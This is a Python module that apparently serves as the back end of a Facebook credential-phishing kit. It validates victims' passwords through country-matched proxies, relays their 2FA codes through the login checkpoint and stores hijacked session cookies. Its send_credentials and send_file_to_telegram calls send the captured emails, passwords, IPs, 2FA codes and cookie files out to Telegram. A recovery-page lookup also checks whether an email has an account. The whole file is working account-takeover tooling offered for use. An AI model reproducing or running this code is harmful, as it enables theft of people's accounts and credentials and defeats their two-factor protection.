from urllib.parse import urlencode
import json
import os
import time

from files import *
from proxy_generate import *
from web import *
from messages import MESSAGES

HEADERS = {
    'Host': 'www.facebook.com',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',  # keep the connection open
}


def get_country_by_ip(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        return data.get("country", "Unknown")
    except:
        return "Unknown"
    

def get_initial_cookies_and_data(session, email, password, proxy, ip, country):
    proxies = {'http': proxy.get('http'), 'https': proxy.get('http')}
    response = session.get('https://www.facebook.com/', headers=HEADERS, proxies=proxies)
    fr = response.cookies.get('fr')
    sb = response.cookies.get('sb')
    _datr = response.text.split('"_js_datr","')[1].split('"')[0]
    _jago = response.text.split('"jazoest" value="')[1].split('"')[0]
    _lsd = response.text.split('name="lsd" value="')[1].split('"')[0]
    cookies = {'fr': fr, 'sb': sb, '_js_datr': _datr, 'wd': '717x730', 'dpr': '1.25'}
    data = {
        'jazoest': _jago,
        'lsd': _lsd,
        'email': email,
        'password': password,
        'proxy': proxy.get('http'),
        'ip': ip,
        'country': country,
        'user-agent': HEADERS['User-Agent'],
        'login_source': 'comet_headerless_login',
        'next': '',
        'encpass': f'#PWD_BROWSER:0:{round(time.time())}:{password}',
        'created': get_vietnam_time()
    }

    return cookies, data  # removed urlencode to keep the data as a dictionary


def login_to_facebook(session, data, proxy):
    proxies = {'http': proxy.get('http'), 'https': proxy.get('http')}

    HEADERS.update({
        'Referer': 'https://www.facebook.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://www.facebook.com',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    })

    response = session.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100', headers=HEADERS, data=urlencode(data), proxies=proxies)
    if 'recover' in response.url or 'login' in response.url:
        print('Password incorrect')
        return False
    else:
        print('Password correct')
        return response


def send_auth_and_save_session(email, password, country):
    country = get_country_by_ip(country)
    proxy, ip = get_proxy_ip(country)

    with requests.Session() as session:
        session.headers.update(HEADERS)  # установка заголовков сессии
        cookies, initial_data = get_initial_cookies_and_data(session, email, password, proxy, ip, country)
        session.cookies.update(cookies)
        password_valid = login_to_facebook(session, initial_data, proxy)
        print(password_valid)
        if password_valid is False:
            return False

        if not os.path.exists("Waiting"):
            os.makedirs("Waiting")

        new_session_path = os.path.join('Waiting', email)
        if not os.path.exists(new_session_path):
            os.makedirs(new_session_path)

        # Save cookies in Netscape format
        cookies_netscape_filename = os.path.join(new_session_path, f'{email}_cookies.txt')
        save_cookies_netscape_format(session, cookies_netscape_filename)

        # Save cookies in JSON format
        cookies_json_filename = os.path.join(new_session_path, f'{email}_cookies.json')
        save_cookies_json_format(session, cookies_json_filename)

        # Save headers
        headers_path = os.path.join(new_session_path, f'{email}_headers.json')
        with open(headers_path, 'w', encoding='utf-8') as file:
            # Преобразуйте заголовки в обычный словарь перед сохранением
            headers_dict = dict(session.headers)
            json.dump(headers_dict, file, ensure_ascii=False, indent=4)


        # Save initial_data
        initial_data_path = os.path.join(new_session_path, f'{email}_initial_data.json')
        with open(initial_data_path, 'w', encoding='utf-8') as file:
            json.dump(initial_data, file, ensure_ascii=False, indent=4)

        msg = MESSAGES['Live'].format(
            initial_data['email'], initial_data['password'], initial_data['user-agent'],
            initial_data['ip'], initial_data['country'], initial_data['proxy'], initial_data['created'])
        

        send_credentials(cookies_netscape_filename, msg)


def load_user_data_and_request(email):
    user_data_path = os.path.join('Waiting', email)
    cookies_json_filename = os.path.join(user_data_path, f'{email}_cookies.json')
    headers_path = os.path.join(user_data_path, f'{email}_headers.json')
    initial_data_path = os.path.join(user_data_path, f'{email}_initial_data.json')

    # Create a new session
    session = requests.Session()

    # Load and set cookies from the saved file
    if os.path.exists(cookies_json_filename):
        with open(cookies_json_filename, 'r') as f:
            cookies = requests.utils.cookiejar_from_dict(json.load(f))
            session.cookies.update(cookies)
    else:
        print(f"Cookie file {cookies_json_filename} not found.")
        return None

    # Load and set headers from the saved file
    if os.path.exists(headers_path):
        with open(headers_path, 'r', encoding='utf-8') as file:
            headers = json.load(file)
            session.headers.update(headers)
    else:
        print(f"Headers file {headers_path} not found.")
        return None

    # Attempt to read initial_data
    if os.path.exists(initial_data_path):
        with open(initial_data_path, 'r', encoding='utf-8') as file:
            initial_data = json.load(file)
    else:
        print(f"Initial data file {initial_data_path} not found.")
        return None

    # Make the GET request
    try:
        response = session.get('https://www.facebook.com/checkpoint/?next', headers=session.headers)

        jazoest = extract_jazoest_value(response.text)
        fb_dtsg = extract_fb_dtsg_value(response.text)
        nh = extract_nh_value(response.text)
        return jazoest, fb_dtsg, nh
    
    except requests.RequestException as e:
        print(f"An error occurred: {e}")
        return None


def check_login(email):
    new_session_path = os.path.join('Waiting', email)
    cookies_json_filename = os.path.join(new_session_path, f'{email}_cookies.json')
    headers_path = os.path.join(new_session_path, f'{email}_headers.json')
    initial_data_path = os.path.join(new_session_path, f'{email}_initial_data.json')

    # Create a new session
    session = requests.Session()

    # Load and set cookies from the saved file
    if os.path.exists(cookies_json_filename):
        with open(cookies_json_filename, 'r') as f:
            cookies = requests.utils.cookiejar_from_dict(json.load(f))
            session.cookies.update(cookies)
    else:
        print(f"Cookie file {cookies_json_filename} not found.")
        return False

    # Load and set headers from the saved file
    if os.path.exists(headers_path):
        with open(headers_path, 'r', encoding='utf-8') as file:
            headers = json.load(file)
            session.headers.update(headers)
    else:
        print(f"Headers file {headers_path} not found.")
        return False

    initial_data = read_json_file(initial_data_path)
    if initial_data is None:
        return False  # Returns False if unable to read initial_data

    additional_data = {
        'jazoest': initial_data['jazoest'],
        'lsd': initial_data['lsd'],
        'submit[Continue]': 'continue'
    }

    response = session.get('https://www.facebook.com/checkpoint/?next=', headers=session.headers, data=additional_data)

    cookies_dict = requests.utils.dict_from_cookiejar(session.cookies)

    if "c_user" in cookies_dict:
        live_session_path = os.path.join('Live', email)
        if not os.path.exists(live_session_path):
            os.makedirs(live_session_path)

        # Save new cookies in the Live/{email}/ directory
        cookies_netscape_live = os.path.join(live_session_path, 'cookies.txt')
        cookies_json_live = os.path.join(live_session_path, 'cookies.json')
        save_cookies_netscape_format(session, cookies_netscape_live)  # save in Netscape format
        save_cookies_json_format(session, cookies_json_live)          # save in JSON format
        print("Log in approved!")

        msg = MESSAGES['Live'].format(
            initial_data['email'], initial_data['password'], initial_data['user-agent'],
            initial_data['ip'], initial_data['country'], initial_data['proxy'], initial_data['created'])
        
        send_file_to_telegram(cookies_netscape_live, msg)

        return True
    else:
        return False


def send_2fa(jazoest, fb_dtsg, nh, approvals_code, email):
    # Путь к файлу куки
    cookies_file_path = os.path.join('Waiting', email, f'{email}_cookies.json')

    # Загрузить куки из файла
    if os.path.exists(cookies_file_path):
        with open(cookies_file_path, 'r') as f:
            cookies = requests.utils.cookiejar_from_dict(json.load(f))
    else:
        print(f"Cookie file {cookies_file_path} not found.")
        return

    # Заголовки
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Alt-Used': 'www.facebook.com',
        'Connection': 'keep-alive',
        'Content-Length': '217',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'www.facebook.com',
        'Origin': 'https://www.facebook.com',
        'Referer': 'https://www.facebook.com/checkpoint/?next',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0'
    }

    # Параметры формы
    payload = {
        'jazoest': jazoest,
        'fb_dtsg': fb_dtsg,
        'submit[Continue]': 'continue',
        'nh': nh,
        'approvals_code': approvals_code
    }

    # URL для запроса
    url = 'https://www.facebook.com/checkpoint/'

    # Создать сессию и установить куки
    session = requests.Session()
    session.cookies = cookies

    # Отправить POST-запрос
    response = session.post(url, headers=headers, data=payload)
    jazoest = extract_jazoest_value(response.text)
    fb_dtsg = extract_fb_dtsg_value(response.text)
    nh = extract_nh_value(response.text)
    if not os.path.exists("Waiting"):
        os.makedirs("Waiting")

    new_session_path = os.path.join('Waiting', email)
    if not os.path.exists(new_session_path):
        os.makedirs(new_session_path)

    # Save cookies in Netscape format
    cookies_netscape_filename = os.path.join(new_session_path, f'{email}_cookies.txt')
    save_cookies_netscape_format(session, cookies_netscape_filename)

    # Save cookies in JSON format
    cookies_json_filename = os.path.join(new_session_path, f'{email}_cookies.json')
    save_cookies_json_format(session, cookies_json_filename)

    # Save headers
    headers_path = os.path.join(new_session_path, f'{email}_headers.json')
    with open(headers_path, 'w', encoding='utf-8') as file:
        # Преобразуйте заголовки в обычный словарь перед сохранением
        headers_dict = dict(session.headers)
        json.dump(headers_dict, file, ensure_ascii=False, indent=4)
    return jazoest, fb_dtsg, nh


def approve_browser(jazoest, fb_dtsg, nh,twofa_code, email):
    # Путь к файлу куки
    cookies_file_path = os.path.join('Waiting', email, f'{email}_cookies.json')

    # Загрузить куки из файла
    if os.path.exists(cookies_file_path):
        with open(cookies_file_path, 'r') as f:
            cookies = requests.utils.cookiejar_from_dict(json.load(f))
    else:
        print(f"Cookie file {cookies_file_path} not found.")
        return

    # Заголовки
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3',
        'Alt-Used': 'www.facebook.com',
        'Connection': 'keep-alive',
        'Content-Length': '217',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'www.facebook.com',
        'Origin': 'https://www.facebook.com',
        'Referer': 'https://www.facebook.com/checkpoint/?next',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0'
    }

    # Параметры формы
    payload = {
        'jazoest': jazoest,
        'fb_dtsg': fb_dtsg,
        'submit[Continue]': 'continue',
        'nh': nh,
        'name_action_selected': 'dont_save'
    }

    # URL для запроса
    url = 'https://www.facebook.com/checkpoint/'

    # Создать сессию и установить куки
    session = requests.Session()
    session.cookies = cookies

    # Отправить POST-запрос
    response = session.post(url, headers=headers, data=payload)
    jazoest = extract_jazoest_value(response.text)
    fb_dtsg = extract_fb_dtsg_value(response.text)
    nh = extract_nh_value(response.text)

    cookies_dict = requests.utils.dict_from_cookiejar(session.cookies)

    if "c_user" in cookies_dict:
        live_session_path = os.path.join('Live', email)
        if not os.path.exists(live_session_path):
            os.makedirs(live_session_path)

        # Save new cookies in the Live/{email}/ directory
        cookies_netscape_live = os.path.join(live_session_path, 'cookies.txt')
        cookies_json_live = os.path.join(live_session_path, 'cookies.json')
        save_cookies_netscape_format(session, cookies_netscape_live)  # save in Netscape format
        save_cookies_json_format(session, cookies_json_live)          # save in JSON format
        print("Log in approved!")

        initial_data_path = os.path.join('Waiting', email, f'{email}_initial_data.json')
        initial_data = read_json_file(initial_data_path)
        if initial_data is None:
            return False  # Returns False if unable to read initial_data
        
        msg = MESSAGES['Live'].format(
            initial_data['email'], initial_data['password'], initial_data['user-agent'],
            initial_data['ip'], initial_data['country'], initial_data['proxy'], initial_data['created'])
        msg = msg + "\n\n⏰ 2FA: \n<b>"+twofa_code+"</b>"
        send_file_to_telegram(cookies_netscape_live, msg)

        return True
    else:
        return False
    

def login_with_2fa(email, twofa_code):
    jazoest, fb_dtsg, nh = load_user_data_and_request(email)
    send_2fa(jazoest, fb_dtsg, nh, str(twofa_code), email)
    time.sleep(5)
    is_correct_2fa = approve_browser(jazoest, fb_dtsg, nh, str(twofa_code),email)
    return is_correct_2fa

def get_data():
        url = 'https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

        headers = {
            'Accept': '*/*',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        }

        rq = requests.get(url,headers=headers)

        # print(rq.text)

        soup = BeautifulSoup(rq.text, 'html.parser')

        # find jazoest
        jazoest = soup.find('input', {'name': 'jazoest'}).get('value')
        # find lsd
        lsd = soup.find('input', {'name': 'lsd'}).get('value')

        cookie = rq.cookies.get_dict()['datr']
        
        print(jazoest, lsd, cookie)

        return jazoest, lsd, cookie
    
def check_valid_account(email: str):
        url = 'https://m.facebook.com/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&alternate_search=1&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0'

        jazoest, lsd, cookie = get_data()

        # payload = f'lsd={lsd}&jazoest={jazoest}&email={email}&did_submit=T%C3%ACm+ki%E1%BA%BFm'
        payload = f'lsd={lsd}&jazoest={jazoest}&email={email}&did_submit=Rechercher'
          
        headers = {
            'Accept': 'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*',
            'Referer': 'https://m.facebook.com/login/identify/?ctx=recover&search_attempts=2&ars=facebook_login&alternate_search=0&toggle_search_mode=1',
            'Accept-Language': 'fr-FR,fr;q=0.8,ar-DZ;q=0.5,ar;q=0.3',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729',
            'Host': 'm.facebook.com',
            'Connection': 'Keep-Alive',
            'Cache-Control': 'no-cache',
            'Cookie':f'datr={cookie}',
            'Content-Length': '84',
        }

        rq = requests.post(url, data=payload, headers=headers)

        if 'Votre recherche ne donne aucun' in rq.text:
            return False
        else:
            return True